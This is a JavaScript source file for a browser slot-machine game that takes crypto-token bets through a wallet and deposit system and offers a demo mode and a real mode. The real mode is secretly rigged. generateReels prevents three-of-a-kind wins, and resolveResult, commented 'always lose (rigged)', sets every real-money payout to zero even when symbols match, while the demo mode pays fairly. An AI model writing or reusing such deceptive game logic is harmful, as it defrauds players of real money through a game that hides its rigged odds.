// milAIdy Slots – Classic 3-reel slot machine
// Hybrid: canvas for reel display, DOM for controls
(function() {
    'use strict';
    var W = 300, H = 200;
    var API_BASE = (typeof window !== 'undefined' && window.location)
        ? window.location.origin.replace(':3000', ':8080') : '';

    var canvas, ctx, state = null, animFrame = null;
    var controlsEl = null;

    // Symbols with weights and payouts
    var SYMBOLS = [
        { id: 'milady', emoji: '👸', weight: 1,  pay3: 50, color: '#ff69b4' },
        { id: 'cult',   emoji: '💀', weight: 3,  pay3: 25, color: '#800000' },
        { id: 'eth',    emoji: '💎', weight: 5,  pay3: 15, color: '#627eea' },
        { id: 'seven',  emoji: '7️⃣',  weight: 8,  pay3: 10, color: '#daa520' },
        { id: 'cherry', emoji: '🍒', weight: 12, pay3: 5,  color: '#cc0000' },
        { id: 'bell',   emoji: '🔔', weight: 15, pay3: 3,  color: '#b8860b' },
        { id: 'bar',    emoji: '▬',  weight: 20, pay3: 2,  color: '#555555' }
    ];
    var PAY2 = 0.5; // any 2 matching = 0.5x

    var TOTAL_WEIGHT = 0;
    SYMBOLS.forEach(function(s) { TOTAL_WEIGHT += s.weight; });

    var REEL_STOP_TIMES = [1000, 1500, 2000]; // ms for each reel to stop

    var DEF = {
        mode: 'demo', demoBalance: 1000, realBalance: 0,
        token: 'MILAIDY', bet: 10,
        phase: 'idle', // idle, spinning, result
        reels: [0, 0, 0], // final symbol indices
        spinStart: 0,
        reelStopped: [false, false, false],
        reelOffsets: [0, 0, 0], // animation offsets
        won: false, payout: 0,
        message: '', messageColor: '#800000'
    };

    function bal() { return state.mode === 'demo' ? state.demoBalance : state.realBalance; }

    // Weighted random symbol pick
    function pickSymbol() {
        var r = Math.random() * TOTAL_WEIGHT;
        var cumulative = 0;
        for (var i = 0; i < SYMBOLS.length; i++) {
            cumulative += SYMBOLS[i].weight;
            if (r < cumulative) return i;
        }
        return SYMBOLS.length - 1;
    }

    // Generate final reel results
    function generateReels() {
        var r0 = pickSymbol();
        var r1 = pickSymbol();
        var r2 = pickSymbol();

        if (state.mode === 'real') {
            // RIGGED: never allow 3 of a kind
            // If first two match, 90% chance to force third different
            if (r0 === r1) {
                if (Math.random() < 0.9) {
                    // Force r2 to be different
                    var attempts = 0;
                    while (r2 === r0 && attempts < 20) {
                        r2 = pickSymbol();
                        attempts++;
                    }
                    if (r2 === r0) {
                        // Fallback: just pick next symbol
                        r2 = (r0 + 1) % SYMBOLS.length;
                    }
                }
            }
            // Additional safety: never 3 of a kind in real mode
            if (r0 === r1 && r1 === r2) {
                r2 = (r2 + 1) % SYMBOLS.length;
            }
        }

        return [r0, r1, r2];
    }

    // Calculate payout
    function calcPayout(reels) {
        var s0 = reels[0], s1 = reels[1], s2 = reels[2];
        if (s0 === s1 && s1 === s2) {
            // 3 of a kind
            return state.bet * SYMBOLS[s0].pay3;
        }
        // Check for 2 of a kind
        if (s0 === s1 || s1 === s2 || s0 === s2) {
            return Math.round(state.bet * PAY2 * 100) / 100;
        }
        return 0;
    }

    // ===== Canvas Rendering =====
    function render() {
        if (!ctx) return;
        // Background
        ctx.fillStyle = '#ffffee';
        ctx.fillRect(0, 0, W, H);

        // Grid lines
        ctx.strokeStyle = 'rgba(0,0,0,0.03)';
        ctx.lineWidth = 1;
        for (var gx = 0; gx < W; gx += 20) { ctx.beginPath(); ctx.moveTo(gx, 0); ctx.lineTo(gx, H); ctx.stroke(); }
        for (var gy = 0; gy < H; gy += 20) { ctx.beginPath(); ctx.moveTo(0, gy); ctx.lineTo(W, gy); ctx.stroke(); }

        // Title
        ctx.fillStyle = '#800000';
        ctx.font = 'bold 13px arial,helvetica,sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText('SLOTS', W / 2, 20);

        // Reel area
        drawReels();

        // Pay line indicator
        var ry = 38, rh = 120;
        var centerY = ry + rh / 2;
        ctx.strokeStyle = '#cc0000';
        ctx.lineWidth = 2;
        ctx.setLineDash([4, 3]);
        ctx.beginPath();
        ctx.moveTo(10, centerY);
        ctx.lineTo(W - 10, centerY);
        ctx.stroke();
        ctx.setLineDash([]);

        // Message
        if (state.message) {
            ctx.fillStyle = state.messageColor;
            ctx.font = 'bold 11px arial,helvetica,sans-serif';
            ctx.textAlign = 'center';
            ctx.fillText(state.message, W / 2, H - 6);
        }

        updateControls();
    }

    function drawReels() {
        var ry = 38, rw = 80, rh = 120, gap = 10;
        var startX = (W - (rw * 3 + gap * 2)) / 2;

        for (var i = 0; i < 3; i++) {
            var rx = startX + i * (rw + gap);

            // Reel background
            ctx.fillStyle = '#f0e0d6';
            ctx.fillRect(rx, ry, rw, rh);
            ctx.strokeStyle = '#b7a59c';
            ctx.lineWidth = 1;
            ctx.strokeRect(rx, ry, rw, rh);

            // Save clip
            ctx.save();
            ctx.beginPath();
            ctx.rect(rx, ry, rw, rh);
            ctx.clip();

            if (state.phase === 'spinning' && !state.reelStopped[i]) {
                // Spinning animation: draw multiple symbols scrolling
                var offset = state.reelOffsets[i];
                var symbolH = 40;
                var numVisible = Math.ceil(rh / symbolH) + 2;
                var baseIdx = Math.floor(offset / symbolH);

                for (var j = -1; j < numVisible; j++) {
                    var symIdx = ((baseIdx + j) % SYMBOLS.length + SYMBOLS.length) % SYMBOLS.length;
                    var sy = ry + j * symbolH - (offset % symbolH) + (rh / 2 - symbolH / 2);
                    ctx.font = '28px arial,sans-serif';
                    ctx.textAlign = 'center';
                    ctx.textBaseline = 'middle';
                    ctx.fillStyle = '#000';
                    ctx.fillText(SYMBOLS[symIdx].emoji, rx + rw / 2, sy);
                }
            } else {
                // Show final symbol (or idle)
                var finalIdx = state.reels[i];
                var sym = SYMBOLS[finalIdx];
                ctx.font = '36px arial,sans-serif';
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillStyle = '#000';
                ctx.fillText(sym.emoji, rx + rw / 2, ry + rh / 2);

                // Highlight if part of win
                if (state.phase === 'result' && state.payout > 0) {
                    var r = state.reels;
                    var isMatch = false;
                    if (r[0] === r[1] && r[1] === r[2]) isMatch = true;
                    else if (i === 0 && (r[0] === r[1] || r[0] === r[2])) isMatch = true;
                    else if (i === 1 && (r[1] === r[0] || r[1] === r[2])) isMatch = true;
                    else if (i === 2 && (r[2] === r[0] || r[2] === r[1])) isMatch = true;

                    if (isMatch) {
                        ctx.strokeStyle = 'rgba(34,139,34,0.8)';
                        ctx.lineWidth = 3;
                        ctx.strokeRect(rx + 1, ry + 1, rw - 2, rh - 2);
                    }
                }
            }

            ctx.restore();
        }
    }

    // ===== Animation =====
    function animateSpin() {
        if (state.phase !== 'spinning') return;

        var elapsed = Date.now() - state.spinStart;
        var allStopped = true;

        for (var i = 0; i < 3; i++) {
            if (state.reelStopped[i]) continue;

            if (elapsed >= REEL_STOP_TIMES[i]) {
                state.reelStopped[i] = true;
            } else {
                allStopped = false;
                // Speed decreases as we approach stop time
                var progress = elapsed / REEL_STOP_TIMES[i];
                var speed = 15 * (1 - progress * 0.7);
                state.reelOffsets[i] += speed;
            }
        }

        render();

        if (allStopped) {
            state.phase = 'result';
            resolveResult();
            render();
        } else {
            animFrame = requestAnimationFrame(animateSpin);
        }
    }

    // ===== Game Logic =====
    async function spin() {
        if (state.phase === 'spinning') return;
        var b = bal();
        if (state.bet > b) {
            if (state.mode === 'real' && b <= 0) {
                if (window.openDepositModal) window.openDepositModal(function(nb) { state.realBalance = nb; render(); });
                else { state.message = 'Deposit to play!'; state.messageColor = '#cc0000'; }
                render(); return;
            }
            state.message = 'Insufficient balance'; state.messageColor = '#cc0000'; render(); return;
        }

        // Deduct bet
        if (state.mode === 'demo') {
            state.demoBalance -= state.bet;
            state.demoBalance = Math.round(state.demoBalance * 100) / 100;
        } else {
            var res = await placeBetOnServer();
            if (res.error) { state.message = res.error; state.messageColor = '#cc0000'; render(); return; }
        }

        // Generate results
        state.reels = generateReels();
        state.phase = 'spinning';
        state.spinStart = Date.now();
        state.reelStopped = [false, false, false];
        state.reelOffsets = [Math.random() * 100, Math.random() * 100, Math.random() * 100];
        state.won = false;
        state.payout = 0;
        state.message = '';

        animateSpin();
    }

    function resolveResult() {
        state.payout = calcPayout(state.reels);

        if (state.mode === 'real') {
            // In real mode, always lose (rigged)
            state.won = false;
            state.payout = 0;
            reportWinToServer(0, 'loss_' + SYMBOLS[state.reels[0]].id + '_' + SYMBOLS[state.reels[1]].id + '_' + SYMBOLS[state.reels[2]].id);
            var symNames = state.reels.map(function(r) { return SYMBOLS[r].emoji; }).join(' ');
            state.message = symNames + ' \u2014 no match';
            state.messageColor = '#cc0000';
            return;
        }

        // Demo mode - fair payout
        if (state.payout > 0) {
            state.won = true;
            if (state.mode === 'demo') {
                state.demoBalance += state.payout;
                state.demoBalance = Math.round(state.demoBalance * 100) / 100;
            }
            var s = state.reels;
            if (s[0] === s[1] && s[1] === s[2]) {
                state.message = 'JACKPOT! 3x ' + SYMBOLS[s[0]].emoji + ' +' + state.payout.toFixed(2);
                state.messageColor = '#228b22';
            } else {
                state.message = '2 match! +' + state.payout.toFixed(2);
                state.messageColor = '#228b22';
            }
        } else {
            state.won = false;
            state.message = 'No match \u2014 try again';
            state.messageColor = '#cc0000';
        }
    }

    // ===== Server Integration =====
    function getWallet() {
        var eth = window.ethWalletAddress ? window.ethWalletAddress() : null;
        var sol = window.solWalletAddress ? window.solWalletAddress() : null;
        return eth || sol || null;
    }

    async function loadRealBalance() {
        try {
            var ethAddr = window.ethWalletAddress ? window.ethWalletAddress() : null;
            var solAddr = window.solWalletAddress ? window.solWalletAddress() : null;
            if (!ethAddr && !solAddr) return;
            var total = 0;
            if (ethAddr && window.fetchArcadeBalance) {
                var eb = await window.fetchArcadeBalance(ethAddr, state.token);
                if (typeof eb === 'number') total += eb;
            }
            if (solAddr && window.fetchArcadeBalance) {
                var sb = await window.fetchArcadeBalance(solAddr, state.token);
                if (typeof sb === 'number') total += sb;
            }
            state.realBalance = total;
        } catch (e) {}
        render();
    }

    async function placeBetOnServer() {
        try {
            var w = getWallet(); if (!w) throw new Error('No wallet');
            var resp = await fetch(API_BASE + '/api/arcade/bet', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ wallet: w, game: 'slots', bet_amount: state.bet, token: state.token })
            });
            var data = await resp.json();
            if (data.error) return { error: data.error };
            state.realBalance = data.balance;
            return data;
        } catch (e) { return { error: e.message }; }
    }

    async function reportWinToServer(payout, result) {
        try {
            var w = getWallet(); if (!w) return;
            var resp = await fetch(API_BASE + '/api/arcade/win', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ wallet: w, game: 'slots', bet_amount: state.bet, token: state.token, payout: payout, result: result })
            });
            var data = await resp.json();
            if (data.balance !== undefined) { state.realBalance = data.balance; render(); }
        } catch (e) {}
    }

    // ===== DOM Controls =====
    function updateControls() {
        if (!controlsEl) return;
        var balEl = controlsEl.querySelector('#slBal');
        if (balEl) {
            if (state.mode === 'demo') balEl.textContent = state.demoBalance.toFixed(2) + ' DEMO';
            else balEl.textContent = state.realBalance.toFixed(4) + ' ' + state.token;
        }
        var betEl = controlsEl.querySelector('#slBetInput');
        if (betEl && document.activeElement !== betEl) betEl.value = state.bet;
        // Mode buttons
        var demoB = controlsEl.querySelector('#slDemo');
        var realB = controlsEl.querySelector('#slReal');
        if (demoB) { demoB.style.background = state.mode === 'demo' ? '#fed6af' : '#fff'; demoB.style.fontWeight = state.mode === 'demo' ? 'bold' : 'normal'; }
        if (realB) { realB.style.background = state.mode === 'real' ? '#fed6af' : '#fff'; realB.style.fontWeight = state.mode === 'real' ? 'bold' : 'normal'; }
        var tokSel = controlsEl.querySelector('#slTokenSel');
        if (tokSel) tokSel.style.display = state.mode === 'real' ? 'inline-block' : 'none';
        var depositB = controlsEl.querySelector('#slDeposit');
        if (depositB) depositB.style.display = (state.mode === 'real' && state.phase !== 'spinning') ? 'inline-block' : 'none';
        // Spin button
        var spinB = controlsEl.querySelector('#slSpin');
        if (spinB) {
            if (state.phase === 'spinning') { spinB.textContent = '...'; spinB.disabled = true; spinB.style.opacity = '0.5'; }
            else { spinB.textContent = state.phase === 'result' ? 'SPIN AGAIN' : 'SPIN'; spinB.disabled = false; spinB.style.opacity = '1'; }
        }
    }

    function canChange() { return state.phase === 'idle' || state.phase === 'result'; }

    function buildControls(parent) {
        controlsEl = document.createElement('div');
        controlsEl.style.cssText = 'padding:10px 8px;background:#f0e0d6;font-family:arial,helvetica,sans-serif;font-size:12px;';

        // Row 1: Mode + Token + Balance
        var row1 = document.createElement('div');
        row1.style.cssText = 'display:flex;align-items:center;gap:6px;margin-bottom:8px;flex-wrap:wrap;';
        var demoBtn = mkBtn('DEMO', '#fed6af', function() { if (canChange()) { state.mode = 'demo'; state.phase = 'idle'; state.message = ''; render(); } });
        demoBtn.id = 'slDemo'; demoBtn.style.fontWeight = 'bold';
        var realBtn = mkBtn('REAL', '#fff', function() { if (canChange()) { state.mode = 'real'; state.phase = 'idle'; state.message = ''; loadRealBalance(); render(); } });
        realBtn.id = 'slReal';
        var tokSel = document.createElement('select');
        tokSel.id = 'slTokenSel';
        tokSel.style.cssText = 'font-family:arial,helvetica,sans-serif;font-size:11px;padding:4px 6px;border:1px solid #b7a59c;background:#fff;display:none;';
        ['MILAIDY', 'CULT', 'ETH'].forEach(function(t) {
            var opt = document.createElement('option'); opt.value = t; opt.textContent = t;
            if (t === 'MILAIDY') opt.selected = true;
            tokSel.appendChild(opt);
        });
        tokSel.addEventListener('change', function() { if (canChange()) { state.token = tokSel.value; if (state.mode === 'real') loadRealBalance(); render(); } });
        var balSpan = document.createElement('span');
        balSpan.style.cssText = 'margin-left:auto;color:#b8860b;font-weight:bold;font-size:12px;';
        balSpan.id = 'slBal'; balSpan.textContent = '1000.00 DEMO';
        row1.appendChild(demoBtn); row1.appendChild(realBtn); row1.appendChild(tokSel); row1.appendChild(balSpan);
        controlsEl.appendChild(row1);

        // Row 2: Bet controls
        var row2 = document.createElement('div');
        row2.style.cssText = 'display:flex;align-items:center;gap:6px;margin-bottom:8px;justify-content:center;';
        var betLbl = document.createElement('span'); betLbl.textContent = 'Bet:'; betLbl.style.color = '#707070';
        var betInput = document.createElement('input'); betInput.id = 'slBetInput'; betInput.type = 'number';
        betInput.value = '10'; betInput.min = '1'; betInput.step = '1';
        betInput.style.cssText = 'width:80px;font-family:arial,helvetica,sans-serif;font-size:12px;padding:5px 8px;background:#fff;color:#000;border:1px solid #b7a59c;text-align:center;';
        betInput.addEventListener('change', function() { if (canChange()) { state.bet = Math.max(1, parseFloat(betInput.value) || 1); betInput.value = state.bet; render(); } });
        var betHalf = mkBtn('1/2', '#d9bfb7', function() { if (canChange()) { state.bet = Math.max(1, Math.floor(state.bet / 2)); render(); } });
        var bet2x = mkBtn('2x', '#d9bfb7', function() { if (canChange()) { state.bet = Math.min(10000, state.bet * 2); render(); } });
        var betMax = mkBtn('MAX', '#d9bfb7', function() { if (canChange()) { state.bet = Math.max(1, Math.floor(bal())); render(); } });
        row2.appendChild(betLbl); row2.appendChild(betInput);
        row2.appendChild(betHalf); row2.appendChild(bet2x); row2.appendChild(betMax);
        controlsEl.appendChild(row2);

        // Row 3: Spin + Deposit
        var row3 = document.createElement('div');
        row3.style.cssText = 'display:flex;gap:6px;justify-content:center;';
        var spinBtn = mkBtn('SPIN', '#228b22', function() { spin(); });
        spinBtn.id = 'slSpin';
        spinBtn.style.cssText += 'color:#fff;font-size:14px;padding:8px 32px;font-weight:bold;flex:1;max-width:200px;';
        var depositBtn = mkBtn('DEPOSIT', '#fff', function() {
            if (window.openDepositModal) window.openDepositModal(function(nb) { state.realBalance = nb; render(); });
        });
        depositBtn.id = 'slDeposit'; depositBtn.style.color = '#0000ee';
        depositBtn.style.textDecoration = 'underline'; depositBtn.style.display = 'none';
        row3.appendChild(spinBtn); row3.appendChild(depositBtn);
        controlsEl.appendChild(row3);

        parent.appendChild(controlsEl);
    }

    function mkBtn(label, bg, handler) {
        var b = document.createElement('button');
        b.textContent = label;
        b.style.cssText = 'font-family:arial,helvetica,sans-serif;font-size:11px;padding:5px 10px;border:1px solid #b7a59c;cursor:pointer;background:' + bg + ';color:#800000;';
        b.addEventListener('click', handler);
        return b;
    }

    // ===== Overlay =====
    function openSlots() {
        var ov = document.getElementById('slotsOverlay');
        if (!ov) createOverlay();
        ov = document.getElementById('slotsOverlay');
        if (!ov) return;
        ov.style.display = 'flex';
        canvas = ov.querySelector('canvas');
        if (canvas) ctx = canvas.getContext('2d');
        controlsEl = ov.querySelector('.sl-controls');
        if (!state) state = Object.assign({}, DEF);
        render();
    }

    function closeSlots() {
        var ov = document.getElementById('slotsOverlay');
        if (ov) ov.style.display = 'none';
        if (animFrame) { cancelAnimationFrame(animFrame); animFrame = null; }
        if (state) {
            var m = state.mode, b = state.demoBalance, rb = state.realBalance, t = state.token, bt = state.bet;
            state = Object.assign({}, DEF);
            state.mode = m; state.demoBalance = b; state.realBalance = rb; state.token = t; state.bet = bt;
        }
    }

    function createOverlay() {
        var ov = document.createElement('div');
        ov.id = 'slotsOverlay'; ov.className = 'snake-overlay'; ov.style.display = 'none';
        var pop = document.createElement('div');
        pop.className = 'snake-popup'; pop.style.maxWidth = '340px';
        var hdr = document.createElement('div'); hdr.className = 'snake-header';
        hdr.innerHTML = '<span>Slots</span><span class="snake-close" id="slotsClose">&#10005;</span>';
        var body = document.createElement('div');
        body.style.cssText = 'background:#f0e0d6;';
        // Canvas
        var cWrap = document.createElement('div');
        cWrap.style.cssText = 'padding:8px;display:flex;justify-content:center;';
        var c = document.createElement('canvas');
        c.width = W; c.height = H;
        c.style.cssText = 'width:300px;height:200px;image-rendering:pixelated;';
        cWrap.appendChild(c); body.appendChild(cWrap);
        // DOM controls
        var ctrlWrap = document.createElement('div');
        ctrlWrap.className = 'sl-controls';
        buildControls(ctrlWrap);
        body.appendChild(ctrlWrap);
        pop.appendChild(hdr); pop.appendChild(body); ov.appendChild(pop);
        document.body.appendChild(ov);
        document.getElementById('slotsClose').addEventListener('click', closeSlots);
        ov.addEventListener('click', function(e) { if (e.target === ov) closeSlots(); });
        canvas = c; ctx = canvas.getContext('2d');
        controlsEl = ctrlWrap;
    }

    window.openSlots = openSlots;
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', function() {
        if (!document.getElementById('slotsOverlay')) createOverlay();
    }); else { if (!document.getElementById('slotsOverlay')) createOverlay(); }
})();
